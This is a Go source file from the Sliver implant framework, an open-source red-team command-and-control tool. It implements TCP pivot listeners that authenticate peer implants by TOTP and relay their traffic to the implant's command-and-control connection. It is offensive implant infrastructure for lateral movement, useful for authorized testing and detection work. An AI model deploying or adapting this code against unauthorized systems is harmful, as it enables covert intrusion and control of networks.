package pivots

/*
  Sliver Implant Framework
  Copyright (C) 2019  Bishop Fox

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}

	"encoding/binary"
	"fmt"
	"log"
	"math/rand"
	"time"

	// {{end}}

	"net"

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

// StartTCPListener - Start a TCP listener
func StartTCPListener(address string) error {
	// {{if .Config.Debug}}
	log.Printf("Starting Raw TCP listener on %s", address)
	// {{end}}
	ln, err := net.Listen("tcp", address)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println(err)
		// {{end}}
		return err
	}
	pivotListeners = append(pivotListeners, &PivotListener{
		Type:          "tcp",
		RemoteAddress: address,
	})
	go tcpPivotAcceptNewConnection(ln)
	return nil
}

func tcpPivotAcceptNewConnection(ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("tcp accept failure: %s", err)
			// {{end}}
			continue
		}
		// handle connection like any other net.Conn
		go tcpPivotConnectionHandler(conn)
	}
}

func tcpPivotConnectionHandler(conn net.Conn) {
	// First we read a uint64 containing the current OTP
	// code to prevent random connections and confirm the
	// peer was compiled by the same server.
	otpBuf := make([]byte, 8)
	conn.SetReadDeadline(time.Now().Add(time.Second * 10))
	n, err := conn.Read(otpBuf)
	if err != nil || n != 8 {
		conn.Close()
		// {{if .Config.Debug}}
		log.Printf("Failed to read otp code from peer: %v\n", err)
		// {{end}}
		return
	}
	otpCode := fmt.Sprintf("%d", binary.LittleEndian.Uint64(otpBuf))
	valid, err := cryptography.ValidateTOTP(otpCode)
	if err != nil || !valid {
		conn.Close()
		// {{if .Config.Debug}}
		log.Printf("Invalid otp code from peer %v\n", err)
		// {{end}}
		return
	}
	// cipherCtx := cryptography.NewCipherContext(cryptography.PeerAESKey(otpCode))
	// tcpPivotStart(cipherCtx, conn)
}

func tcpPivotStart(cipherCtx *cryptography.CipherContext, conn net.Conn) {
	pivotID := pivotID()

	// defer func() {
	// 	// {{if .Config.Debug}}
	// 	log.Printf("Cleaning up for pivot %d\n", pivotID)
	// 	// {{end}}
	// 	conn.Close()
	// 	pivotClose := &sliverpb.PivotClose{
	// 		PivotID: pivotID,
	// 	}
	// 	data, err := proto.Marshal(pivotClose)
	// 	if err != nil {
	// 		// {{if .Config.Debug}}
	// 		log.Println(err)
	// 		// {{end}}
	// 		return
	// 	}
	// 	connection := transports.GetActiveConnection()
	// 	if connection.IsOpen {
	// 		connection.Send <- &sliverpb.Envelope{
	// 			Type: sliverpb.MsgPivotClose,
	// 			Data: data,
	// 		}
	// 	}
	// }()

	for {
		envelope, err := PivotReadEnvelope(cipherCtx, conn)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println(err)
			// {{end}}
			return
		}

		dataBuf, err1 := proto.Marshal(envelope)
		if err1 != nil {
			// {{if .Config.Debug}}
			log.Println(err1)
			// {{end}}
			return
		}
		pivotData := &sliverpb.PivotData{
			PivotID: pivotID,
			Data:    dataBuf,
		}
		connection := transports.GetActiveConnection()
		if envelope.Type == 1 {
			SendPivotOpen(pivotID, dataBuf, connection)
			continue
		}
		data2, err2 := proto.Marshal(pivotData)
		if err2 != nil {
			// {{if .Config.Debug}}
			log.Println(err2)
			// {{end}}
			return
		}
		if connection.IsOpen {
			connection.Send <- &sliverpb.Envelope{
				Type: sliverpb.MsgPivotData,
				Data: data2,
			}
		}
	}
}

func pivotID() uint32 {
	buf := make([]byte, 4)
	rand.Read(buf)
	return binary.LittleEndian.Uint32(buf)
}
